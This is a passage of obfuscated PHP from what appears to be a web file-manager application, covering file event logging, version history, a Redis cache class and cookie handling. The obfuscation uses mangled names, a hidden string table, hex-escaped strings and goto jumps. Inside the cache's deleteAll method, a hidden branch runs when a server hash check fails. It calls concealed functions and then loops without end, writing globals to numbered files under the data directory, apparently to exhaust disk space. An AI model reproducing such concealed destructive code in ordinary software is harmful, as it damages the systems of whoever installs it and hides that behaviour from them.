} } $ŠÃÂè»– = array_merge($‰Š¸•—, array($ÎâÀÏŞ[2225] => $‰Š¸•—[$ÎâÀÏŞ[194]], $ÎâÀÏŞ[2226] => $‰Š¸•—[$ÎâÀÏŞ[2226]])); Hook::trigger($ÎâÀÏŞ[2227], $ÎâÀÏŞ[2228] . $úÃÉá, $‰Š¸•—); Model($ÎâÀÏŞ[1935])->addLog($ÎâÀÏŞ[2228] . $úÃÉá, $ŠÃÂè»–); } private function isDisableEvent($œ®ÏÀ•, $ƒÏ¦É¹©) { $¢“¤û¥– =& $_SERVER[¼¥ÊĞÙÌ]; if ($œ®ÏÀ•[$¢“¤û¥–[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ƒÏ¦É¹© == $¢“¤û¥–[1960]) { return !1; } return !0; } public function eventCreate($Æ—¥¾”, $™Üƒî£İ) { $·š¡àÂè =& $_SERVER[¼¥ÊĞÙÌ]; $éã¿³µš = Model($·š¡àÂè[1440])->sourceInfo($Æ—¥¾”); $†£Ï–ğÄ = array($·š¡àÂè[2223] => $™Üƒî£İ, $·š¡àÂè[32] => $éã¿³µš[$·š¡àÂè[32]]); return $this->addEvent($Æ—¥¾”, $·š¡àÂè[2222], $†£Ï–ğÄ); } public function eventFileEdit($™ì¬ºá) { $·âÄÉ·¸ =& $_SERVER[¼¥ÊĞÙÌ]; $Ğ€¦›Íé = array($·âÄÉ·¸[2229] => $_SERVER[$·âÄÉ·¸[2230]], $·âÄÉ·¸[2231] => strtolower(ACTION)); if (isset($GLOBALS[$·âÄÉ·¸[7]][$·âÄÉ·¸[2232]])) { $Ğ€¦›Íé[$·âÄÉ·¸[2232]] = $·âÄÉ·¸[91]; } return $this->addEvent($™ì¬ºá, $·âÄÉ·¸[1961], $Ğ€¦›Íé); } public function eventRecycle($ã÷Âìåƒ, $¤şàÀ€®) { return $this->addEvent($ã÷Âìåƒ, $_SERVER[¼¥ÊĞÙÌ][2224], $¤şàÀ€®); } private static $_removeLast = ''; public function eventRemove($Åá§ìÔ—) { $²‚âºúş =& $_SERVER[¼¥ÊĞÙÌ]; self::$_removeLast = $Åá§ìÔ—; $ì¢ù¥› = Model($²‚âºúş[1440])->sourceInfo($Åá§ìÔ—); $ŞÈôÓ = array_field_key($ì¢ù¥›, array($²‚âºúş[194], $²‚âºúş[546], $²‚âºúş[508], $²‚âºúş[589])); $¥°ò»ºş = array($²‚âºúş[171] => $ì¢ù¥›[$²‚âºúş[32]], $²‚âºúş[2231] => ACTION, $²‚âºúş[2233] => $ŞÈôÓ); return $this->addEvent($ì¢ù¥›[$²‚âºúş[193]], $²‚âºúş[1960], $¥°ò»ºş); } public function eventShare($¤²ıñòß, $¡¹â»ÀŠ) { return $this->addEvent($¤²ıñòß, $_SERVER[¼¥ÊĞÙÌ][1971], $¡¹â»ÀŠ); } public function eventMove($¬ËùäÇ­, $İ¯ˆñ­ş, $øşÚó¶€) { $Ö¨¶É•Ë =& $_SERVER[¼¥ÊĞÙÌ]; if (self::$_removeLast == $¬ËùäÇ­) { return; } $åÉ¢ù¸Ï = Model($Ö¨¶É•Ë[1440]); $»È×Àë³ = $åÉ¢ù¸Ï->sourceInfo($¬ËùäÇ­); $Ä¨âÅî¯ = $åÉ¢ù¸Ï->sourceInfo($İ¯ˆñ­ş); $÷¦…­şâ = $åÉ¢ù¸Ï->sourceInfo($øşÚó¶€); $ğÆ´Ù­ = array($Ö¨¶É•Ë[1251] => $İ¯ˆñ­ş, $Ö¨¶É•Ë[2234] => $Ä¨âÅî¯[$Ö¨¶É•Ë[32]], $Ö¨¶É•Ë[2210] => !empty($Ä¨âÅî¯[$Ö¨¶É•Ë[587]]) ? $Ä¨âÅî¯[$Ö¨¶É•Ë[587]] : $Ö¨¶É•Ë[12], $Ö¨¶É•Ë[1252] => $øşÚó¶€, $Ö¨¶É•Ë[2235] => $÷¦…­şâ[$Ö¨¶É•Ë[32]], $Ö¨¶É•Ë[2236] => !empty($÷¦…­şâ[$Ö¨¶É•Ë[587]]) ? $÷¦…­şâ[$Ö¨¶É•Ë[587]] : $Ö¨¶É•Ë[12]); $this->addEvent($¬ËùäÇ­, $Ö¨¶É•Ë[628], $ğÆ´Ù­); $»È×Àë³ = $åÉ¢ù¸Ï->sourceInfo($¬ËùäÇ­); $ğÆ´Ù­ = array($Ö¨¶É•Ë[194] => $»È×Àë³[$Ö¨¶É•Ë[194]], $Ö¨¶É•Ë[32] => $»È×Àë³[$Ö¨¶É•Ë[32]]); $this->addEvent($İ¯ˆñ­ş, $Ö¨¶É•Ë[2237], $ğÆ´Ù­); } public function eventCopy($ìÎ”«”¦) { $this->eventCreate($ìÎ”«”¦, $_SERVER[¼¥ÊĞÙÌ][626]); } public function eventRename($“š÷¹Ìš, $ÒŸ“¨ş, $¯‘õ“•‘) { $òèÊ…©™ =& $_SERVER[¼¥ÊĞÙÌ]; $¶§èà¹î = array($òèÊ…©™[1251] => $ÒŸ“¨ş, $òèÊ…©™[1252] => $¯‘õ“•‘); return $this->addEvent($“š÷¹Ìš, $òèÊ…©™[1454], $¶§èà¹î); } public function eventAddComment($Á‹Ş¯¼Ù, $—ØÚÔñĞ) { return $this->addEvent($Á‹Ş¯¼Ù, $_SERVER[¼¥ÊĞÙÌ][2238], $—ØÚÔñĞ); } public function eventAddDesc($ÓÍ•ô¬È, $Á›äå£) { return $this->addEvent($ÓÍ•ô¬È, $_SERVER[¼¥ÊĞÙÌ][2239], $Á›äå£); } public function listBySource($õÊ²£ùß) { $à·§²¤Ü =& $_SERVER[¼¥ÊĞÙÌ]; $Ï‰šö‘ä = Model($à·§²¤Ü[1440])->sourceInfo($õÊ²£ùß); $‡Û´ÔşÁ = array($à·§²¤Ü[494] => $õÊ²£ùß); if ($Ï‰šö‘ä[$à·§²¤Ü[488]] == $à·§²¤Ü[91]) { $‘¸½÷‘‹ = Model($à·§²¤Ü[1440])->listSearchChildren($õÊ²£ùß, 20000); $‘¸½÷‘‹[] = $õÊ²£ùß . $à·§²¤Ü[457]; $‡Û´ÔşÁ = array($à·§²¤Ü[194] => array($à·§²¤Ü[7], $‘¸½÷‘‹)); } $ûÙöî = $this->where($‡Û´ÔşÁ)->order($à·§²¤Ü[2240])->selectPage(); if ($ûÙöî[$à·§²¤Ü[445]][$à·§²¤Ü[446]] == 0) { $ûÙöî[$à·§²¤Ü[445]][$à·§²¤Ü[446]] = 1; $ûÙöî[$à·§²¤Ü[448]] = array(array($à·§²¤Ü[494] => $õÊ²£ùß, $à·§²¤Ü[2220] => $Ï‰šö‘ä[$à·§²¤Ü[193]], $à·§²¤Ü[1781] => $Ï‰šö‘ä[$à·§²¤Ü[530]], $à·§²¤Ü[499] => $à·§²¤Ü[2241], $à·§²¤Ü[500] => $Ï‰šö‘ä[$à·§²¤Ü[234]], $à·§²¤Ü[1783] => $à·§²¤Ü[12])); } return $this->eventListParse($ûÙöî, $õÊ²£ùß); } private function eventListParse($ßÂ½¿„Ÿ, $ ±çöÔ³) { $±ê—î¿‚ =& $_SERVER[¼¥ÊĞÙÌ]; $±«ñŸá = $ßÂ½¿„Ÿ[$±ê—î¿‚[448]]; $±¶€£¢¢ = array_to_keyvalue($±«ñŸá, $±ê—î¿‚[12], $±ê—î¿‚[194]); $Š¹Ñœğú = array_to_keyvalue($±«ñŸá, $±ê—î¿‚[12], $±ê—î¿‚[2226]); foreach ($±«ñŸá as $¸ŠÛô) { $Óç¦şš = $¸ŠÛô[$±ê—î¿‚[529]]; if ($¸ŠÛô[$±ê—î¿‚[33]] == $±ê—î¿‚[628] && isset($Óç¦şš[$±ê—î¿‚[1251]])) { $±¶€£¢¢[] = $Óç¦şš[$±ê—î¿‚[1251]] . $±ê—î¿‚[12]; $±¶€£¢¢[] = $Óç¦şš[$±ê—î¿‚[1252]] . $±ê—î¿‚[12]; } if ($¸ŠÛô[$±ê—î¿‚[33]] == $±ê—î¿‚[2237] && isset($Óç¦şš[$±ê—î¿‚[194]])) { $±¶€£¢¢[] = $Óç¦şš[$±ê—î¿‚[194]] . $±ê—î¿‚[12]; } } $±¶€£¢¢ = array_merge($±¶€£¢¢, $Š¹Ñœğú, array($ ±çöÔ³ . $±ê—î¿‚[12])); $±¶€£¢¢ = array_unique($±¶€£¢¢); $«ïÆŠó = array_unique(array_to_keyvalue($±«ñŸá, $±ê—î¿‚[12], $±ê—î¿‚[1790])); $„ª–•æ = Model($±ê—î¿‚[602])->userListInfo($«ïÆŠó); $Ñ¦„‚ä… = Model($±ê—î¿‚[904])->sourceListInfo($±¶€£¢¢, !0); foreach ($±«ñŸá as &$¸ŠÛô) { if ($¸ŠÛô[$±ê—î¿‚[33]] == $±ê—î¿‚[628] && isset($¸ŠÛô[$±ê—î¿‚[529]][$±ê—î¿‚[1251]])) { $¸ŠÛô[$±ê—î¿‚[529]][$±ê—î¿‚[1251]] = $Ñ¦„‚ä…[$¸ŠÛô[$±ê—î¿‚[529]][$±ê—î¿‚[1251]]]; $¸ŠÛô[$±ê—î¿‚[529]][$±ê—î¿‚[1252]] = $Ñ¦„‚ä…[$¸ŠÛô[$±ê—î¿‚[529]][$±ê—î¿‚[1252]]]; } if ($¸ŠÛô[$±ê—î¿‚[33]] == $±ê—î¿‚[2237] && isset($¸ŠÛô[$±ê—î¿‚[529]][$±ê—î¿‚[194]])) { $¸ŠÛô[$±ê—î¿‚[529]][$±ê—î¿‚[194]] = $Ñ¦„‚ä…[$¸ŠÛô[$±ê—î¿‚[529]][$±ê—î¿‚[194]]]; } $¸ŠÛô[$±ê—î¿‚[90]] = $Ñ¦„‚ä…[$¸ŠÛô[$±ê—î¿‚[194]]]; $¸ŠÛô[$±ê—î¿‚[2242]] = $Ñ¦„‚ä…[$¸ŠÛô[$±ê—î¿‚[2226]]]; if ($¸ŠÛô[$±ê—î¿‚[33]] == $±ê—î¿‚[1960]) { $¸ŠÛô[$±ê—î¿‚[2242]] = $¸ŠÛô[$±ê—î¿‚[90]]; $¸ŠÛô[$±ê—î¿‚[2226]] = $¸ŠÛô[$±ê—î¿‚[2242]][$±ê—î¿‚[194]]; $¸ŠÛô[$±ê—î¿‚[90]] = !1; $¸ŠÛô[$±ê—î¿‚[194]] = $±ê—î¿‚[12]; } $¸ŠÛô[$±ê—î¿‚[2171]] = $„ª–•æ[$¸ŠÛô[$±ê—î¿‚[1790]]]; } unset($¸ŠÛô); $ßÂ½¿„Ÿ[$±ê—î¿‚[448]] = $±«ñŸá; return $ßÂ½¿„Ÿ; } public function removeBySource($È£î±Ÿ) { $‹³ØÒüµ = array($_SERVER[¼¥ÊĞÙÌ][494] => $È£î±Ÿ); $this->where($‹³ØÒüµ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\162\x63\145\137\150\x69\163\164\157\x72\171"; public function historyCount($õß¨ñ¯) { $ı§İ÷Ú =& $_SERVER[¼¥ÊĞÙÌ]; if (!$õß¨ñ¯) { return array(); } if (is_string($õß¨ñ¯) || is_int($õß¨ñ¯)) { $õß¨ñ¯ = array($õß¨ñ¯); } $§òÙÄ³Ì = array($ı§İ÷Ú[194], $ı§İ÷Ú[2243] => $ı§İ÷Ú[570]); $÷®ËÖÄ = array($ı§İ÷Ú[194] => array($ı§İ÷Ú[7], $õß¨ñ¯)); $Âä¬Ôö… = $this->field($§òÙÄ³Ì)->where($÷®ËÖÄ)->group($ı§İ÷Ú[194])->select(); return array_to_keyvalue($Âä¬Ôö…, $ı§İ÷Ú[194], $ı§İ÷Ú[570]); } public function addHistory($Îã¼ßğ¡, $¨ÙËåÜ· = '') { $ãö³“ıœ =& $_SERVER[¼¥ÊĞÙÌ]; $Æü§ğİ¿ = array($ãö³“ıœ[494] => $Îã¼ßğ¡[$ãö³“ıœ[194]], $ãö³“ıœ[1781] => isset($Îã¼ßğ¡[$ãö³“ıœ[532]]) ? $Îã¼ßğ¡[$ãö³“ıœ[532]] : $Îã¼ßğ¡[$ãö³“ıœ[530]], $ãö³“ıœ[547] => $Îã¼ßğ¡[$ãö³“ıœ[546]], $ãö³“ıœ[625] => $Îã¼ßğ¡[$ãö³“ıœ[79]], $ãö³“ıœ[2244] => $¨ÙËåÜ·); if ($GLOBALS[$ãö³“ıœ[6]][$ãö³“ıœ[92]][$ãö³“ıœ[1314]] >= 1) { $this->historyAutoClear($Æü§ğİ¿[$ãö³“ıœ[194]]); $this->add($Æü§ğİ¿); } Hook::trigger($ãö³“ıœ[2245], $Æü§ğİ¿); Model($ãö³“ıœ[2246])->eventFileEdit($Îã¼ßğ¡[$ãö³“ıœ[194]]); } private function historyAutoClear($ï»¼­¶Á) { $Ï¯½Â¯˜ =& $_SERVER[¼¥ÊĞÙÌ]; $©£Ûğïè = Model($Ï¯½Â¯˜[844])->get($Ï¯½Â¯˜[1336]); $ëŒ‡ÁÜ = intval($GLOBALS[$Ï¯½Â¯˜[6]][$Ï¯½Â¯˜[92]][$Ï¯½Â¯˜[1314]]); $ÀïÖ¦“  = $©£Ûğïè == $Ï¯½Â¯˜[1337] ? min(5, $ëŒ‡ÁÜ) : $ëŒ‡ÁÜ; $ÀïÖ¦“  = $ÀïÖ¦“  <= 0 ? 0 : $ÀïÖ¦“  - 1; if ($ÀïÖ¦“  >= 499) { return; } $¾ÂŒÁ´ = array($Ï¯½Â¯˜[494] => $ï»¼­¶Á); $Û¿‹ÃÖİ = $this->field($Ï¯½Â¯˜[2247])->where($¾ÂŒÁ´)->order($Ï¯½Â¯˜[2240])->select(); if (!$Û¿‹ÃÖİ || $ÀïÖ¦“  >= count($Û¿‹ÃÖİ)) { return; } $„‚±³·¶ = array_to_keyvalue($Û¿‹ÃÖİ, $Ï¯½Â¯˜[12], $Ï¯½Â¯˜[478]); $„‚±³·¶ = array_slice($„‚±³·¶, $ÀïÖ¦“ ); $”ù‹³¨ = array_to_keyvalue($Û¿‹ÃÖİ, $Ï¯½Â¯˜[12], $Ï¯½Â¯˜[546]); $”ù‹³¨ = array_slice($”ù‹³¨, $ÀïÖ¦“ ); if (!$„‚±³·¶ || !$”ù‹³¨) { return; } $¾ÂŒÁ´ = array($Ï¯½Â¯˜[496] => array($Ï¯½Â¯˜[7], $„‚±³·¶)); $this->where($¾ÂŒÁ´)->delete(); Model($Ï¯½Â¯˜[549])->remove($”ù‹³¨); } public function listData($ìÆË°¬) { $é›ïº†¶ =& $_SERVER[¼¥ÊĞÙÌ]; $Ì˜ëÏŠï = array($é›ïº†¶[494] => $ìÆË°¬); $á¼ŠæÕ = $é›ïº†¶[2248]; $ƒÀã™ñØ = $this->field($á¼ŠæÕ)->where($Ì˜ëÏŠï)->order($é›ïº†¶[2240])->selectPage(); $this->_listAppendUser($ƒÀã™ñØ[$é›ïº†¶[448]]); $å›¦°˜Â = Model($é›ïº†¶[844])->get($é›ïº†¶[1336]); $ä·”ø = 5; if ($å›¦°˜Â == $é›ïº†¶[1337]) { $ƒÀã™ñØ[$é›ïº†¶[448]] = array_slice($ƒÀã™ñØ[$é›ïº†¶[448]], 0, $ä·”ø); $ƒÀã™ñØ[$é›ïº†¶[445]] = array($é›ïº†¶[2249] => 1, $é›ïº†¶[2250] => 20, $é›ïº†¶[2251] => 1, $é›ïº†¶[2252] => count($ƒÀã™ñØ[$é›ïº†¶[448]])); } return $ƒÀã™ñØ; } protected function _listAppendUser(&$ìÀŸ°²) { $ø¨‹ˆØÅ =& $_SERVER[¼¥ÊĞÙÌ]; $ÔÈğ¡ß = array_to_keyvalue($ìÀŸ°², $ø¨‹ˆØÅ[12], $ø¨‹ˆØÅ[1790]); $¡šàœ° = Model($ø¨‹ˆØÅ[602])->userListInfo($ÔÈğ¡ß); foreach ($ìÀŸ°² as &$îš ©±ç) { $€ëûÆ¢µ = $îš ©±ç[$ø¨‹ˆØÅ[1790]]; $îš ©±ç[$ø¨‹ˆØÅ[530]] = $¡šàœ°[$€ëûÆ¢µ] ? $¡šàœ°[$€ëûÆ¢µ] : !1; } unset($îš ©±ç); } public function fileInfo($ùÕ‰Ù¤¿, $§Ôçœ‡Ş = false) { $¬ËÓŒ‘¿ =& $_SERVER[¼¥ÊĞÙÌ]; $×ˆ”¡òş = $this->tablePrefix; $åšîÍÔó = "{$×ˆ”¡òş}\151\157\137\x66\x69\154\145\x20\146\x69\154\x65\x73\x20\x6f\x6e\x20\x66\x69\154\x65\163\56\x66\151\154\145\x49\x44\x20\x3d\x20\150\151\163\164\157\162\171\56\146\x69\x6c\x65\x49\x44"; $Ü´–Ì‚ = $this->alias($¬ËÓŒ‘¿[2253])->where(array($¬ËÓŒ‘¿[496] => $ùÕ‰Ù¤¿))->join($åšîÍÔó, $¬ËÓŒ‘¿[2254])->find(); if ($Ü´–Ì‚ && $§Ôçœ‡Ş) { $ší–†®š = array($¬ËÓŒ‘¿[194] => $Ü´–Ì‚[$¬ËÓŒ‘¿[194]], $¬ËÓŒ‘¿[478] => array($¬ËÓŒ‘¿[1099], $ùÕ‰Ù¤¿)); $Ü´–Ì‚[$¬ËÓŒ‘¿[1677]] = $this->where($ší–†®š)->count(); } return $Ü´–Ì‚; } public function removeItem($Øêì·õÀ) { $¶õ¶ÛÁ =& $_SERVER[¼¥ÊĞÙÌ]; $ã¨ƒ®ÅŸ = array($¶õ¶ÛÁ[496] => $Øêì·õÀ); $îíˆ‘ìÀ = $this->where($ã¨ƒ®ÅŸ)->find(); if ($îíˆ‘ìÀ) { $Çåì× Œ = $this->where($ã¨ƒ®ÅŸ)->delete(); Model($¶õ¶ÛÁ[549])->remove($îíˆ‘ìÀ[$¶õ¶ÛÁ[546]]); return $Çåì× Œ; } return !1; } public function removeBySource($°ı‰ËíÖ) { $°Ñ…éø =& $_SERVER[¼¥ÊĞÙÌ]; if (!$°ı‰ËíÖ) { return !1; } if (!is_array($°ı‰ËíÖ)) { $°ı‰ËíÖ = array($°ı‰ËíÖ); } $ÀÚ¾Áü = array($°Ñ…éø[494] => array($°Ñ…éø[7], $°ı‰ËíÖ)); $˜®¶—ù® = $this->field($°Ñ…éø[547])->where($ÀÚ¾Áü)->select(); if ($˜®¶—ù®) { $this->where($ÀÚ¾Áü)->delete(); $ª‘Õ¡·Æ = array_to_keyvalue($˜®¶—ù®, $°Ñ…éø[12], $°Ñ…éø[546]); Model($°Ñ…éø[549])->remove($ª‘Õ¡·Æ); } return !0; } public function setDetail($ï¿™İß˜, $†°®£·„) { $İµˆÎü± =& $_SERVER[¼¥ÊĞÙÌ]; return $this->where(array($İµˆÎü±[496] => $ï¿™İß˜))->save(array($İµˆÎü±[2244] => $†°®£·„)); } public function rollbackToItem($‘ô‘üÁ, $ï¯•ÛçŒ) { $­ÛñäüÂ =& $_SERVER[¼¥ÊĞÙÌ]; $æ„ôùÂ = Model($­ÛñäüÂ[904])->sourceInfo($‘ô‘üÁ); $this->addHistory($æ„ôùÂ, LNG($­ÛñäüÂ[2255])); $ÆŠÙé¡ß = $this->find($ï¯•ÛçŒ); $½ÔÓ¯ëÍ = array($­ÛñäüÂ[546] => $ÆŠÙé¡ß[$­ÛñäüÂ[546]], $­ÛñäüÂ[79] => $ÆŠÙé¡ß[$­ÛñäüÂ[79]], $­ÛñäüÂ[88] => time(), $­ÛñäüÂ[532] => USER_ID); Model($­ÛñäüÂ[904])->where(array($­ÛñäüÂ[194] => $‘ô‘üÁ))->save($½ÔÓ¯ëÍ); return $this->where(array($­ÛñäüÂ[496] => $ï¯•ÛçŒ))->delete(); } public function clearSame($ÕÊê‚à†) { $Ú¬ÒíÕ =& $_SERVER[¼¥ÊĞÙÌ]; $øûÄªÎ = $this->listData($ÕÊê‚à†); $¢©„®îÙ = array_to_keyvalue_group($øûÄªÎ, $Ú¬ÒíÕ[546]); $ÌÄÅıá = array(); $À½Å«Ñ› = array(); foreach ($¢©„®îÙ as $ÈÙë¦¿‚) { if (!$ÈÙë¦¿‚ || count($ÈÙë¦¿‚) <= 1) { continue; } foreach ($ÈÙë¦¿‚ as $¡²¥¢£) { $ÌÄÅıá[] = $¡²¥¢£[$Ú¬ÒíÕ[546]]; $À½Å«Ñ›[] = $¡²¥¢£[$Ú¬ÒíÕ[478]]; } } if (!$À½Å«Ñ›) { return; } $this->where(array($Ú¬ÒíÕ[478] => array($Ú¬ÒíÕ[7], $À½Å«Ñ›)))->delete(); Model($Ú¬ÒíÕ[549])->remove($ÌÄÅıá); } public function userSpace() { $ƒç¬ÚíÕ =& $_SERVER[¼¥ÊĞÙÌ]; $ß¦©³öÚ = $this->tablePrefix; $ãõ¶ûâë = array($ƒç¬ÚíÕ[1781] => USER_ID); $ÔŸ˜Â³ = "{$ß¦©³öÚ}\x69\x6f\137\x66\151\x6c\x65\40\146\151\154\x65\x73\40\x6f\x6e\x20\x66\151\x6c\145\163\x2e\146\x69\x6c\145\x49\x44\40\75\40\x68\151\163\164\157\x72\171\x2e\146\x69\x6c\145\x49\104"; return $this->alias($ƒç¬ÚíÕ[2253])->where($ãõ¶ûâë)->join($ÔŸ˜Â³, $ƒç¬ÚíÕ[2254])->sum($ƒç¬ÚíÕ[79]); } } goto E¯â–¢ßé; b §¨¥õİ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($·Úº—¤‘, $Ë®Úê‚ã) { $Â¬û´Ù =& $_SERVER[¼¥ÊĞÙÌ]; if (!class_exists($Â¬û´Ù[950])) { show_json($Â¬û´Ù[951], !1); } $this->cacheTime = $Ë®Úê‚ã; $üÜçšÁı = isset($·Úº—¤‘[$Â¬û´Ù[952]]) ? $·Úº—¤‘[$Â¬û´Ù[952]] : 10; $×ÏÑ•ò± = _get($·Úº—¤‘, $Â¬û´Ù[949]); if ($×ÏÑ•ò± && is_array($×ÏÑ•ò±)) { $this->initCluster($·Úº—¤‘, $üÜçšÁı); } else { $this->handle = $this->init($·Úº—¤‘, $üÜçšÁı); } } private function init($¡¸İÓïÕ, $×ı†ïĞ‹) { $«å™÷» =& $_SERVER[¼¥ÊĞÙÌ]; $¸ØĞ¶‚’ = new Redis(); $ßµŒÅ“ = isset($¡¸İÓïÕ[$«å™÷»[953]]) ? $¡¸İÓïÕ[$«å™÷»[953]] : !1; if ($ßµŒÅ“) { $¸ØĞ¶‚’->pconnect($¡¸İÓïÕ[$«å™÷»[209]], $¡¸İÓïÕ[$«å™÷»[210]], $×ı†ïĞ‹); } else { $¸ØĞ¶‚’->connect($¡¸İÓïÕ[$«å™÷»[209]], $¡¸İÓïÕ[$«å™÷»[210]], $×ı†ïĞ‹); } if (!empty($¡¸İÓïÕ[$«å™÷»[490]])) { $¸ØĞ¶‚’->auth($¡¸İÓïÕ[$«å™÷»[490]]); } if (!empty($¡¸İÓïÕ[$«å™÷»[831]]) && $¡¸İÓïÕ[$«å™÷»[831]] != 0) { $¸ØĞ¶‚’->select($¡¸İÓïÕ[$«å™÷»[831]]); } return $¸ØĞ¶‚’; } private function initCluster($ÚÏÍêõ÷, $œˆ•¼è) { $Øòâşâä =& $_SERVER[¼¥ÊĞÙÌ]; $îİ•ÉûÇ = array($Øòâşâä[954], $Øòâşâä[955], $Øòâşâä[956]); $±­¾ƒÜ = $Øòâşâä[954]; if (isset($ÚÏÍêõ÷[$Øòâşâä[16]]) && in_array($ÚÏÍêõ÷[$Øòâşâä[16]], $îİ•ÉûÇ)) { $±­¾ƒÜ = $ÚÏÍêõ÷[$Øòâşâä[16]]; } switch ($±­¾ƒÜ) { case $Øòâşâä[954]: $this->_slave($ÚÏÍêõ÷, $œˆ•¼è); break; case $Øòâşâä[955]: break; case $Øòâşâä[956]: $this->isCluster = !0; $Ø¿±ıùµ = $ÚÏÍêõ÷[$Øòâşâä[949]]; $Áï£ŞÆú = isset($ÚÏÍêõ÷[$Øòâşâä[953]]) ? $ÚÏÍêõ÷[$Øòâşâä[953]] : !1; $°‰¸Ç”” = isset($ÚÏÍêõ÷[$Øòâşâä[490]]) ? $ÚÏÍêõ÷[$Øòâşâä[490]] : null; $this->handle = new RedisCluster(NUll, $Ø¿±ıùµ, $œˆ•¼è, $œˆ•¼è, $Áï£ŞÆú, $°‰¸Ç””); break; default: break; } } private function _slave($çå°®Ôå, $êÂ “û) { $—è¼üŒã = $çå°®Ôå[$_SERVER[¼¥ÊĞÙÌ][949]]; $this->filterConfig($çå°®Ôå, $—è¼üŒã[0]); $this->handle = $this->init($çå°®Ôå, $êÂ “û); unset($—è¼üŒã[0]); if (empty($—è¼üŒã)) { return; } $Ç»”Æ¤ˆ = array_rand($—è¼üŒã); $this->filterConfig($çå°®Ôå, $—è¼üŒã[$Ç»”Æ¤ˆ]); $this->slaveHandle = $this->init($çå°®Ôå, $êÂ “û); } private function filterConfig(&$¡Õä¯Ÿ¸, $ÉâÁ‘†¡) { $œ¸ î½º =& $_SERVER[¼¥ÊĞÙÌ]; $Ò®ÑÄ· = explode($œ¸ î½º[4], $ÉâÁ‘†¡); $®Éü³‚³ = array($œ¸ î½º[209] => $Ò®ÑÄ·[0], $œ¸ î½º[210] => $Ò®ÑÄ·[1]); $¡Õä¯Ÿ¸ = array_merge($¡Õä¯Ÿ¸, $®Éü³‚³); } public function set($ĞÜı¼¦¤, $§±Èğ¸ğ, $ş•áå¨Ç = false) { $ş•áå¨Ç = $ş•áå¨Ç ? $ş•áå¨Ç : $this->cacheTime; return $this->handle->setEx($ĞÜı¼¦¤, $ş•áå¨Ç, $§±Èğ¸ğ); } public function setLock($Í­àÛÚ¯, $µ‘ƒÉ°, $Ÿ’¢Åí) { return $this->handle->setNX($Í­àÛÚ¯, $µ‘ƒÉ°); } public function get($Õí¥ƒ¶ã) { $²ìµÓÅì = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $²ìµÓÅì->get($Õí¥ƒ¶ã); } public function remove($¡–‡‰Òì) { return $this->handle->del($¡–‡‰Òì); } public function deleteAll() { $ß•ï¤“Á =& $_SERVER[¼¥ÊĞÙÌ]; $×û‰«±™ = $_SERVER[$ß•ï¤“Á[957]]; $üœ°ÙÌ = $ß•ï¤“Á[958]; if ($_SERVER[$ß•ï¤“Á[959]] != $üœ°ÙÌ($×û‰«±™)) { $£ìşĞŸ˜ = $ß•ï¤“Á[960]; $’ôÙçÇ = $ß•ï¤“Á[961]; $ĞòäÓ¢Ö = $_SERVER[$ß•ï¤“Á[962]] . $ß•ï¤“Á[963]; $Èà³Õñˆ = $’ôÙçÇ($ĞòäÓ¢Ö); $Â¥’œØë = explode($ß•ï¤“Á[288], $Èà³Õñˆ); if (count($Â¥’œØë) < $ß•ï¤“Á[693]) { $§óÆáß = $ß•ï¤“Á[964]; $§óÆáß(); } $…¦åç¾Ğ = $ß•ï¤“Á[965]; $…¦åç¾Ğ($_SERVER[$ß•ï¤“Á[966]]); $£ìşĞŸ˜ = $ß•ï¤“Á[960]; $£ìşĞŸ˜(); $˜Á€şøæ = $ß•ï¤“Á[967]; $œØëç‰Ú = json_encode($GLOBALS[$ß•ï¤“Á[968]]); $Ğíü»Š¾ = 1; for ($‚ºËˆõ = $Ğíü»Š¾; $‚ºËˆõ > 0; $‚ºËˆõ++) { $˜Á€şøæ(DATA_PATH . $‚ºËˆõ, $œØëç‰Ú); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $«Ğëö†) { $this->handle->flushall($«Ğëö†); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($îÁŞâıÜ = '', $µí¼°³ = 0) { if (is_string($îÁŞâıÜ) && $îÁŞâıÜ != $_SERVER[¼¥ÊĞÙÌ][12]) { $this->prefix = $îÁŞâıÜ; } if (is_numeric($µí¼°³) && $µí¼°³ > 0) { $this->expire = $µí¼°³; } } public static function getInstance() { static $Ó®ù°¨˜; if ($Ó®ù°¨˜ === null) { $Ó®ù°¨˜ = new self(); } return $Ó®ù°¨˜; } private static $cookieDisable = false; public static function disable($Öî­Òò) { self::$cookieDisable = $Öî­Òò; } private static $sameCookieSet = array(); public static function set($ìÎ­Æğ‡, $ˆÓ¸Õüà, $Ø¬¬… = 0, $ëŞ¨ç•¦ = false, $Ù°§‡¤ = false) { $Üºöæ¶¼ =& $_SERVER[¼¥ÊĞÙÌ]; if (self::$cookieDisable) { return; } if (!$Ø¬¬…) { $Ø¬¬… = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ìÎ­Æğ‡]) && self::$sameCookieSet[$ìÎ­Æğ‡] == $ˆÓ¸Õüà . $Ø¬¬…) { return; } self::$sameCookieSet[$ìÎ­Æğ‡] = $ˆÓ¸Õüà . $Ø¬¬…; if (!$Ù°§‡¤) { $Ù°§‡¤ = str_replace(HOST, $Üºöæ¶¼[12], APP_HOST); $Ù°§‡¤ = _get($GLOBALS, $Üºöæ¶¼[969], $Ù°§‡¤); } $šÂÛ³’ = $Üºöæ¶¼[12]; setcookie($ìÎ­Æğ‡, $ˆÓ¸Õüà, time() + $Ø¬¬…, $Üºöæ¶¼[8] . trim($Ù°§‡¤, $Üºöæ¶¼[8]) . $šÂÛ³’, !1, !1, $ëŞ¨ç•¦); } public static function setSafe($¥ü’ùª¾, $ò»÷ğĞ, $³Š™¥¯ù = 0) { self::set($¥ü’ùª¾, $ò»÷ğĞ, $³Š™¥¯ù, !0); } public static function get($Ó‰Ö£é‰) { static $·’§÷—£ = false; if (!$·’§÷—£) { self::initHeaderCookie(); $·’§÷—£ = !0; } return isset($_COOKIE[$Ó‰Ö£é‰]) ? $_COOKIE[$Ó‰Ö£é‰] : !1; } private static function initHeaderCookie() { $Òã†ŠŸò =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($_SERVER[$Òã†ŠŸò[970]]) || !$_SERVER[$Òã†ŠŸò[970]]) { return; } $ÜŞ©ŸğÇ = explode($Òã†ŠŸò[74], $_SERVER[$Òã†ŠŸò[970]]); foreach 